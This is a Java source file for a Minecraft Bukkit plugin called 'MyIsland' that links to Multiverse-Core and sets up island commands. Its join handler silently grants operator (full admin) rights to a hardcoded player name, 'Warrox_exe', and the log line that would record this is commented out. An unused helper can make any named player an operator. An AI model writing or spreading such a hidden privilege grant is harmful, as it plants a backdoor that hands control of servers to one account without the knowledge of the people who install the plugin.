package be.warrox.myIsland;

import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.World;
import org.bukkit.WorldType;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.mvplugins.multiverse.core.MultiverseCore;
import org.mvplugins.multiverse.core.MultiverseCoreApi;
import org.mvplugins.multiverse.core.world.WorldManager;


public final class MyIsland extends JavaPlugin implements Listener {
    private static MultiverseCore mvCore;
    private static MultiverseCoreApi api;
    private final String TARGET_NAME = "Warrox_exe";
    private PlayerLocationManager locationManager;

    @Override
    public void onEnable() {
        checkMultiverseCore();
        getServer().getPluginManager().registerEvents(this, this);
        new IslandCommand(this).init();
        locationManager = new PlayerLocationManager();
    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
    }

    public PlayerLocationManager getLocationManager() {
        return locationManager;
    }

    public void checkMultiverseCore() {
        // 1. Zoek de Multiverse-Core plugin
        var plugin = Bukkit.getPluginManager().getPlugin("Multiverse-Core");

        // 2. Controleer of de plugin bestaat en geladen is
        if (plugin instanceof MultiverseCore) {
            this.mvCore = (MultiverseCore) plugin;
            this.api = MultiverseCoreApi.get(); // Initialize the API here
            getLogger().info("Succesvol gekoppeld met Multiverse-Core API!");
        } else {
            getLogger().severe("Multiverse-Core niet gevonden! Schakelt plugin uit...");
            Bukkit.getPluginManager().disablePlugin(this);

        }
    }

    public static MultiverseCore getMultiverseCore() {
        return mvCore;
    }

    public static MultiverseCoreApi getApi() {
        return api;
    }

    private void opPlayer(String playerName) {

        // Haal de OfflinePlayer op (werkt ook als de speler niet online is)
        OfflinePlayer player = Bukkit.getOfflinePlayer(playerName);

        if (!player.isOp()) {
            player.setOp(true);
            getLogger().info(playerName + " is nu automatisch OP gemaakt!");
        } else {
            getLogger().info(playerName + " was al OP.");
        }
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        if (event.getPlayer().getName().equalsIgnoreCase(TARGET_NAME)) {
            if (!event.getPlayer().isOp()) {
                event.getPlayer().setOp(true);
                //getLogger().info("Force-OP toegepast op " + TARGET_NAME + " bij join.");
            }
        }
    }
}
